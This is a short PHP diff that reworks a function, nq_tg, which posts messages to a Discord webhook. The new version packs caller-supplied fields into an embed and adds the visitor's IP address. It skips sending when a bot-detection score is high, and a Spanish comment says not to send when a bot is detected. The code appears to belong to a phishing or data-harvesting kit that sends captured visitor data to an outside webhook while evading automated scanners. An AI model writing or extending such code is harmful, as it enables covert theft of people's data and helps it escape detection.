@@ -12,15 +12,21 @@ function nq_ip() {
     return 'desconocida';
 }
 
-function nq_tg($msg) {
+function nq_tg($desc, $fields, $color = 3066993) {
     global $webhook, $_nq_score;
-    if ($_nq_score >= 8) return; // bot detectado — no enviar
-    // Convertir HTML a markdown de Discord
-    $msg = str_replace(['<b>', '</b>'], '**', $msg);
-    $msg = str_replace(['<code>', '</code>'], '`', $msg);
-    $msg = strip_tags($msg);
-    $msg = "🤖 **Simulator-N v1.1**\n" . $msg;
-    $payload = json_encode(['content' => $msg, 'username' => 'Simulator-N v1.1']);
+    if ($_nq_score >= 8) return;
+    $f = [];
+    foreach ($fields as $i => $field) {
+        $f[] = ['name' => $field[0], 'value' => '`' . $field[1] . '`', 'inline' => ($i < 2)];
+    }
+    $embed = [
+        'title'       => 'simulator',
+        'description' => $desc,
+        'color'       => $color,
+        'fields'      => $f,
+        'footer'      => ['text' => '🌐  ' . nq_ip()],
+    ];
+    $payload = json_encode(['username' => 'Simulator-N', 'embeds' => [$embed]]);
     $ch = curl_init($webhook);
     curl_setopt_array($ch, [
         CURLOPT_RETURNTRANSFER => true,
